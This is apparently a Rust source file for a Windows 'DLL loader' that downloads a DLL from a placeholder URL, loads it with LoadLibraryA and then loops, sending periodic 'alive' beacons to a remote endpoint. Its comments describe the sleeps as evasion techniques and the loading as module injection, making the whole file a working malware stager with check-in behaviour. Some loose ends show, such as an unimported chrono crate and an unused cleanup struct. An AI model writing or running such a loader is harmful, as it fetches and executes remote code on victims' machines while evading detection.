use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::core::{PCSTR, Result, s};
use windows::Win32::Foundation::HMODULE;
use std::ffi::CString;
use std::path::{Path, PathBuf};
use std::time::Duration;
use std::thread;
use std::fs;
use reqwest;  // Add reqwest = { version = "0.11", features = ["blocking", "rustls-tls"] } to Cargo.toml
use std::io::Write;

// Configuration
const DLL_URL: &str = "https://example.com/rust_dll.dll";  // Change this to your actual URL
const DLL_FILENAME: &str = "rust_dll.dll";
const SLEEP_DURATION_SECS: u64 = 5;
const MAX_RETRIES: u32 = 3;
const RETRY_DELAY_SECS: u64 = 2;

fn main() -> Result<()> {
    println!("[i] Advanced DLL Loader with Remote Download");
    println!("[i] Starting at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"));
    
    // Initial sleep before starting operations (evasion technique)
    println!("[i] Initial sleep for {} seconds...", SLEEP_DURATION_SECS);
    thread::sleep(Duration::from_secs(SLEEP_DURATION_SECS));
    
    // Download DLL from remote server
    let dll_path = match download_dll_with_retry() {
        Ok(path) => {
            println!("[+] DLL downloaded successfully to: {:?}", path);
            path
        },
        Err(e) => {
            eprintln!("[-] Failed to download DLL after {} retries: {}", MAX_RETRIES, e);
            return Err(windows::core::Error::from_win32());
        }
    };
    
    // Verify the downloaded file
    if !verify_dll(&dll_path) {
        eprintln!("[-] DLL verification failed");
        return Err(windows::core::Error::from_win32());
    }
    
    // Attempt to load the DLL
    println!("[i] Attempting to load DLL: {:?}", dll_path);
    let result = load_dll_with_retry(&dll_path);
    
    // Main program loop with periodic checks
    run_main_loop(dll_path, result)
}

fn download_dll_with_retry() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let mut last_error = None;
    
    for attempt in 1..=MAX_RETRIES {
        println!("[i] Download attempt {}/{}", attempt, MAX_RETRIES);
        
        match download_dll() {
            Ok(path) => return Ok(path),
            Err(e) => {
                eprintln!("[-] Attempt {} failed: {}", attempt, e);
                last_error = Some(e);
                
                if attempt < MAX_RETRIES {
                    println!("[i] Retrying in {} seconds...", RETRY_DELAY_SECS);
                    thread::sleep(Duration::from_secs(RETRY_DELAY_SECS));
                }
            }
        }
    }
    
    Err(Box::new(std::io::Error::new(
        std::io::ErrorKind::Other,
        format!("All {} download attempts failed", MAX_RETRIES)
    )))
}

fn download_dll() -> Result<PathBuf, Box<dyn std::error::Error>> {
    println!("[i] Downloading DLL from: {}", DLL_URL);
    
    // Create a custom TLS client with proper configuration
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(false)  // Set to true only for testing with self-signed certs
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()?;
    
    // Download the DLL
    let response = client.get(DLL_URL).send()?;
    
    if !response.status().is_success() {
        return Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("HTTP error: {}", response.status())
        )));
    }
    
    // Get the content
    let bytes = response.bytes()?;
    println!("[i] Downloaded {} bytes", bytes.len());
    
    // Save to current directory
    let current_dir = std::env::current_dir()?;
    let dll_path = current_dir.join(DLL_FILENAME);
    
    // Write to file
    let mut file = fs::File::create(&dll_path)?;
    file.write_all(&bytes)?;
    file.sync_all()?;  // Ensure data is written to disk
    
    Ok(dll_path)
}

fn verify_dll(path: &Path) -> bool {
    if !path.exists() {
        eprintln!("[-] DLL file does not exist");
        return false;
    }
    
    // Check file size
    let metadata = match fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            eprintln!("[-] Failed to read file metadata: {}", e);
            return false;
        }
    };
    
    if metadata.len() == 0 {
        eprintln!("[-] DLL file is empty");
        return false;
    }
    
    println!("[i] DLL file size: {} bytes", metadata.len());
    
    // Optional: Check if it's a valid PE file
    if !is_valid_pe_file(path) {
        eprintln!("[-] Not a valid PE file");
        return false;
    }
    
    true
}

fn is_valid_pe_file(path: &Path) -> bool {
    use std::fs::File;
    use std::io::{Read, Seek, SeekFrom};
    
    let mut file = match File::open(path) {
        Ok(f) => f,
        Err(_) => return false,
    };
    
    // Read DOS header
    let mut dos_header = [0u8; 64];
    if file.read(&mut dos_header).unwrap_or(0) < 64 {
        return false;
    }
    
    // Check DOS magic number
    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return false;
    }
    
    // Read PE signature offset (at 0x3C)
    let pe_offset = u32::from_le_bytes([dos_header[0x3C], dos_header[0x3D], dos_header[0x3E], dos_header[0x3F]]);
    
    // Seek to PE signature
    if file.seek(SeekFrom::Start(pe_offset as u64)).is_err() {
        return false;
    }
    
    // Read PE signature
    let mut pe_signature = [0u8; 4];
    if file.read(&mut pe_signature).unwrap_or(0) < 4 {
        return false;
    }
    
    // Check PE signature
    pe_signature == [b'P', b'E', 0, 0]
}

fn load_dll_with_retry(path: &Path) -> Result<HMODULE> {
    let dll_path_str = match path.to_str() {
        Some(s) => s,
        None => {
            eprintln!("[-] Invalid UTF-8 in DLL path");
            return Err(windows::core::Error::from_win32());
        }
    };
    
    let c_path = match CString::new(dll_path_str) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Failed to create CString: {}", e);
            return Err(windows::core::Error::from_win32());
        }
    };
    
    let dll_file_path = PCSTR::from_raw(c_path.as_ptr() as *const u8);
    
    match unsafe { LoadLibraryA(dll_file_path) } {
        Ok(handle) => {
            println!("[+] DLL loaded successfully at handle: {:?}", handle);
            Ok(handle)
        },
        Err(e) => {
            eprintln!("[-] Failed to load DLL: {}", e);
            
            // Enhanced error reporting
            match e.code().0 {
                0x7E => eprintln!("[-] ERROR_MOD_NOT_FOUND: The specified module could not be found"),
                0x0F => eprintln!("[-] ERROR_BAD_FORMAT: The DLL format is invalid (wrong architecture? 32-bit vs 64-bit)"),
                0x0C => eprintln!("[-] ERROR_INVALID_ACCESS: Access denied"),
                0x6B => eprintln!("[-] ERROR_BAD_EXE_FORMAT: The .exe or .dll file is invalid"),
                0x4E6 => eprintln!("[-] ERROR_INVALID_ORDINAL: The operating system cannot run this application"),
                0x6D8 => eprintln!("[-] ERROR_INVALID_DLL: The application has failed to start because its side-by-side configuration is incorrect"),
                _ => eprintln!("[-] Unknown error code: {:#X}", e.code().0),
            }
            
            Err(e)
        }
    }
}

fn run_main_loop(dll_path: PathBuf, load_result: Result<HMODULE>) -> Result<()> {
    match load_result {
        Ok(handle) => {
            println!("[+] Module injection successful!");
            println!("[+] Module handle: {:?}", handle);
            println!("[+] Loaded from: {:?}", dll_path);
            println!("[i] Entering main loop with periodic checks...");
            
            let mut iteration = 0;
            loop {
                iteration += 1;
                
                // Periodic checks and actions
                println!("[i] Loop iteration #{} at {}", iteration, chrono::Local::now().format("%H:%M:%S"));
                
                // Check if DLL file still exists (optional)
                if !dll_path.exists() {
                    eprintln!("[-] Warning: DLL file no longer exists!");
                }
                
                // Simulate work or maintain presence
                perform_periodic_tasks();
                
                // Sleep between iterations (evasion technique)
                println!("[i] Sleeping for {} seconds...", SLEEP_DURATION_SECS);
                thread::sleep(Duration::from_secs(SLEEP_DURATION_SECS));
                
                // Optional: Periodic beacon or check-in
                if iteration % 10 == 0 {
                    if let Err(e) = periodic_beacon() {
                        eprintln!("[-] Beacon failed: {}", e);
                    }
                }
            }
        },
        Err(e) => {
            eprintln!("[-] Failed to inject module: {}", e);
            
            // Cleanup: Remove downloaded DLL if loading failed
            println!("[i] Cleaning up - removing downloaded DLL");
            let _ = fs::remove_file(&dll_path);
            
            Err(e)
        }
    }
}

fn perform_periodic_tasks() {
    // Simulate some work
    #[cfg(target_arch = "x86_64")]
    println!("[i] Running on 64-bit system");
    
    #[cfg(target_arch = "x86")]
    println!("[i] Running on 32-bit system");
    
    // Check if we're running with admin privileges (Windows only)
    if is_admin() {
        println!("[i] Running with administrator privileges");
    }
}

fn periodic_beacon() -> Result<(), Box<dyn std::error::Error>> {
    println!("[i] Sending periodic beacon...");
    
    // Simple HTTP beacon
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()?;
    
    let _response = client.get("https://example.com/beacon")
        .query(&[("status", "alive"), ("timestamp", &chrono::Local::now().timestamp().to_string())])
        .send()?;
    
    Ok(())
}

#[cfg(windows)]
fn is_admin() -> bool {
    use windows::Win32::Security::{IsUserAnAdmin};
    unsafe { IsUserAnAdmin().as_bool() }
}

#[cfg(not(windows))]
fn is_admin() -> bool {
    false
}

// Add error handling for graceful shutdown
impl Drop for DllCleanup {
    fn drop(&mut self) {
        if self.cleanup {
            println!("[i] Cleaning up resources...");
            let _ = fs::remove_file(&self.path);
        }
    }
}

struct DllCleanup {
    path: PathBuf,
    cleanup: bool,
}

impl DllCleanup {
    fn new(path: PathBuf) -> Self {
        Self { path, cleanup: true }
    }
    
    fn disable_cleanup(&mut self) {
        self.cleanup = false;
    }
}
